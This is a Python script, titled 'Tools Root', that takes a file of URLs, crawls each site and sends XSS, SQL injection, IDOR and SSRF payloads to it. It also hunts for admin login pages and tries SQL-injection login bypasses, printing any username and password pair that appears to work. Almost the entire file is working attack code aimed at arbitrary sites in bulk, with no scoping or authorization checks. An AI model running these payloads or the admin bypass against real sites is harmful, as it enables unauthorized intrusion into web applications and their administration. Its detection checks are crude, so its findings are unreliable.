import requests
from bs4 import BeautifulSoup
import os
import time
from colorama import Fore, init
from tqdm import tqdm
import pandas as pd
import pyfiglet
from concurrent.futures import ThreadPoolExecutor

init(autoreset=True)

# Vulnerability payloads
xss_payloads = ["<script>alert('XSS')</script>", "<img src='x' onerror='alert(1)'>"]
sql_payloads = ["' OR 1=1 --", '" OR "a"="a', "' UNION SELECT NULL, NULL --"]
idor_user_ids = [1, 2, 3, 9999]
ssrf_payload = "http://example.com"

# Functions for vulnerability scanning
def scan_xss(url):
    results = []
    for payload in xss_payloads:
        try:
            response = requests.get(f"{url}?q={payload}", timeout=10)
            if payload in response.text:
                results.append({"payload": payload, "path": f"{url}?q={payload}"})
        except requests.exceptions.RequestException:
            continue
    return results

def scan_sql_injection(url):
    results = []
    for payload in sql_payloads:
        try:
            response = requests.get(f"{url}?id={payload}", timeout=10)
            if "syntax" in response.text.lower() or "mysql" in response.text.lower():
                results.append({"payload": payload, "path": f"{url}?id={payload}"})
        except requests.exceptions.RequestException:
            continue
    return results

def scan_idor(url):
    results = []
    for user_id in idor_user_ids:
        path = f"{url}/profile/{user_id}"
        try:
            response = requests.get(path, timeout=10)
            if response.status_code == 200 and "user" in response.text.lower():
                results.append({"payload": f"User ID: {user_id}", "path": path})
        except requests.exceptions.RequestException:
            continue
    return results

def scan_ssrf(url):
    try:
        response = requests.get(f"{url}?url={ssrf_payload}", timeout=10)
        if "example" in response.text.lower():
            return {"payload": ssrf_payload, "path": f"{url}?url={ssrf_payload}"}
    except requests.exceptions.RequestException:
        return None

# Admin panel discovery and bypass
def discover_admin_page(site):
    admin_paths = [
        "admin", "admin.php", "admin/login.php", "login", "administrator", "adminpanel",
        "admin_login", "cpanel", "dashboard", "admin_area", "admin_console"
    ]
    for path in admin_paths:
        admin_url = f"{site}/{path}"
        try:
            response = requests.get(admin_url, timeout=10)
            if response.status_code == 200 and "login" in response.text.lower():
                return admin_url
        except requests.exceptions.RequestException:
            continue
    return None

def bypass_admin(admin_url):
    payloads = [
        {"username": "' OR 1=1 --", "password": "any"},
        {"username": "admin", "password": "' OR '1'='1"},
        {"username": "root", "password": "' UNION SELECT 1,2,3 --"}
    ]
    for payload in payloads:
        try:
            response = requests.post(admin_url, data=payload, timeout=10)
            if "dashboard" in response.text.lower() or response.status_code == 200:
                return {"path": admin_url, "username": payload["username"], "password": payload["password"]}
        except requests.exceptions.RequestException:
            continue
    return None

# Crawling and scanning
def crawl_site(url):
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        links = [url]
        for link in soup.find_all('a', href=True):
            if link['href'].startswith('http'):
                links.append(link['href'])
            elif link['href'].startswith('/'):
                links.append(url + link['href'])
        return set(links)
    except requests.exceptions.RequestException:
        return []

# Main scanning function
def scan_site(url):
    print(Fore.YELLOW + f"Scanning site: {url}")
    links = crawl_site(url)
    results = []

    for link in links:
        print(Fore.CYAN + f"Scanning link: {link}")
        results.extend(scan_xss(link))
        results.extend(scan_sql_injection(link))
        results.extend(scan_idor(link))
        ssrf_result = scan_ssrf(link)
        if ssrf_result:
            results.append(ssrf_result)
    
    admin_url = discover_admin_page(url)
    if admin_url:
        bypass_result = bypass_admin(admin_url)
        if bypass_result:
            results.append({
                "path": bypass_result["path"], 
                "payload": f"Username: {bypass_result['username']} Password: {bypass_result['password']}", 
                "vulnerability": "Admin Bypass"
            })

    return results

# Display results
def display_results(results):
    if results:
        df = pd.DataFrame(results)
        print(Fore.GREEN + df.to_string(index=False))
    else:
        print(Fore.RED + "No vulnerabilities detected.")

# Program entry point
def main():
    print(Fore.LIGHTCYAN_EX + pyfiglet.figlet_format("Tools Root", font="slant"))
    filename = input(Fore.CYAN + "Enter the file containing URLs (e.g., list.txt): ")

    if not os.path.exists(filename):
        print(Fore.RED + f"File '{filename}' not found.")
        return

    with open(filename, 'r') as file:
        urls = [line.strip() for line in file.readlines()]

    all_results = []
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(scan_site, url): url for url in urls}
        for future in tqdm(futures, desc="Scanning Sites"):
            all_results.extend(future.result())

    display_results(all_results)

if __name__ == "__main__":
    main()
